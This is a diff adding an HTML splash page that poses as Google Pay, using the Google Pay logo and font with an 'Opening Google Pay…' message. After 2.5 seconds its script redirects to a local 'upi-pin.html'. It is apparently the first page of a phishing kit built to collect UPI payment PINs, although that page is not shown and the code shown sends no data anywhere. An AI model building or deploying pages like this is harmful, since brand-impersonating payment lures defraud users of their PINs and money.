@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Google Pay</title>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box;}
+    body{
+      background:#fff;height:100vh;display:flex;flex-direction:column;
+      justify-content:center;align-items:center;font-family:'Google Sans',sans-serif;
+      padding:20px;overflow:hidden;
+    }
+    .gpay-logo{width:clamp(100px,30vw,120px);height:auto;
+      animation:fadeIn 0.8s ease-out, pulse 1.5s infinite;}
+    .loading-text{margin-top:25px;font-size:clamp(16px,5vw,18px);color:#5f6368;
+      opacity:0;animation:fadeIn 1s 0.5s forwards;}
+    .status{margin-top:10px;font-size:14px;color:#34a853;opacity:0;animation:fadeIn 1s 1s forwards;}
+    @keyframes fadeIn{from{opacity:0;transform:translateY(10px);}to{opacity:1;transform:translateY(0);}}
+    @keyframes pulse{0%,100%{transform:scale(1);}50%{transform:scale(1.05);}}
+  </style>
+</head>
+<body>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_Pay_Logo.svg" alt="Google Pay" class="gpay-logo">
+  <div class="loading-text">Opening Google Pay…</div>
+  <div class="status">Please wait...</div>
+
+  <script>
+    setTimeout(() => {
+      window.location.href = 'upi-pin.html';
+    }, 2500);
+  </script>
+</body>
+</html>
